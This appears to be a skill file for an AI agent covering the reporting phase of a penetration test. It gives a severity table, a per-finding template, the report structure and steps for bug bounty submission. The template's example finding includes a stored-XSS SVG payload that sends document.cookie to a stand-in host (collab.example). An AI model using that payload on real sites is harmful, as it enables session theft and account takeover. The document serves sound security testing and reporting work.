---
name: writing-penetration-test-report
description: Phase 6 of the offensive pipeline — turn the findings log and evidence into a structured penetration test report: executive summary, per-finding entries with severity, exact reproduction steps, impact, evidence, and remediation, ordered for triager attention (ATO/RCE first), plus a deduplication and program-submission pass. Use at the end of an engagement, driven by the orchestrating-end-to-end-web-attack skill.
domain: cybersecurity
subdomain: penetration-testing
tags:
- reporting
- findings
- severity
- remediation
- pentest
- bug-bounty
version: '1.0'
author: lucas
license: Apache-2.0
nist_csf:
- ID.RA-05
- RS.MA-02
mitre_attack:
- T1059
---

# Writing the Penetration Test Report

## Purpose

A finding that isn't written down well is a finding that gets triaged as a dupe or a "won't fix". This phase converts the execution log into: (1) an internal report (full detail, for the team), (2) per-finding submission blocks (for a bug bounty program, if applicable). The standard for every entry: a triager with zero context reproduces it in 10 minutes.

## Inputs

- `05-execution/findings-log.md`
- `05-execution/evidence/W*/`
- `00-scope.md`, `04-attack-plan.md` (for the "tested / not tested" section)

## Workflow

### 1. Deduplicate & Merge

- Merge chain-hops into single findings (upload→LFI→RCE = ONE "Remote Code Execution via file upload" finding, not three)
- Merge same-root-cause findings (two endpoints with the same IDOR pattern = one finding listing both, or two if they hit different data classes)
- Drop `CLEAN`/`SKIPPED` from findings; they go to the coverage section

### 2. Assign Severity

Per finding, state severity with reasoning (don't just slap a label):

| Severity | Typical criteria |
|---|---|
| **Critical** | RCE, ATO of any user without interaction, cross-tenant data leak, unauth access to core data |
| **High** | Stored XSS, IDOR on PII, SSRF to cloud metadata/internal, SAML/OAuth bypass, MFA bypass, subdomain takeover with session-cookie scope |
| **Medium** | Reflected XSS, CORS with credentials, open redirect → token leak, host header injection, verbose errors with stack traces, sensitive data in response |
| **Low** | Missing headers, info disclosure (versions), user enumeration, clickjacking on non-sensitive actions |
| **Info** | Best-practice gaps, hardening notes |

Cross-check against the program's severity rubric if it's a bounty (programs define ATO = critical etc.). When in doubt, severity follows **demonstrated impact**, not theoretical impact.

### 3. Per-Finding Template

```markdown
## [SEV] <Short title> — <asset>

**Summary.** One sentence: what is vulnerable, how, and the impact.
"File upload on app.target.com/settings accepts .svg files and serves them as image/svg+xml, enabling stored same-origin XSS as any visiting user."

**Steps to reproduce.**
1. Log in as test1 (or: no auth required)
2. `POST /api/v1/avatar` (multipart, filename=canary.svg, content-type image/svg+xml)
   [full request from evidence]
3. Open `https://app.target.com/uploads/<uuid>.svg`
   [response headers showing image/svg+xml]
4. Payload in canary.svg: `<svg xmlns="..."><img src=x onerror="fetch('https://collab.example/?c='+encodeURIComponent(document.cookie))">`
5. Observe callback / session cookie delivered

**Impact.** What an attacker can do NOW with this (not "could maybe").
"Steal any visitor's session cookie via a profile page view → full ATO. No user interaction beyond viewing a profile."

**Evidence.**
- evidence/W2/02-request.http
- evidence/W2/03-response.http
- evidence/W2/04-proof.png

**Remediation.** Specific and actionable.
"Validate extension against a strict allowlist server-side (.png/.jpg/.webp), serve uploads with a Content-Type derived from the validated extension (or X-Content-Type-Options: nosniff + re-encode images), and store user uploads on a separate origin (cdn.target.com) with a CSP excluding script execution."
```

Rules:
- Reproduction must be copy-paste runnable (defanged secrets stay defanged but note where)
- Impact = demonstrated, in the target's business context
- Remediation = what to change, not "validate input"

### 4. Report Structure (`06-report.md`)

```markdown
# Penetration Test Report — <target> — <date>
## 1. Executive summary
<3-5 sentences: scope, method, headline findings (count by severity), top risk in one sentence>
## 2. Findings (ordered: Critical → Info)
<per-finding template>
## 3. Attack surface tested (coverage)
<from inventory + plan: assets tested, windows tested, windows skipped/blocked and why, noisy tests performed (timestamp)>
## 4. Positive observations
<controls that worked well — builds trust, and helps the next test>
## 5. Recommendations (beyond individual fixes)
<systemic: e.g. "add subdomain monitoring", "move uploads to separate origin", "review SAML parser">
## 6. Methodology & tooling
<phases, skills used, time spent>
```

### 5. Bounty Submission Pass (if applicable)

For each Critical/High finding, produce a program-ready block:
- Title format: `<Vuln class> in <asset> leading to <impact>`
- The 10-minute reproduction (shorter than the report version — cut to the minimal request)
- Screenshot/GIF reference
- One-paragraph impact in the program's language (their users, their data)
- Check against the program's known-issues list BEFORE submitting (avoid the dupe rejection)
- Submit in severity order, spaced per program rules if any

### 6. User Review Checkpoint

Walk the user through: findings in severity order, each with its evidence. Fix any "this isn't actually exploitable" or "I missed X" before the report is final. Update STATE.md → Phase 6 complete, engagement done.

## Output

- `06-report.md` (full internal report)
- `06-submissions/<sev>-<slug>.md` (bounty blocks, if applicable)
- STATE.md → complete

## Gate (engagement complete)

- Every FINDING from the log appears in the report with severity + evidence
- Coverage section honest (what was NOT tested)
- User has reviewed
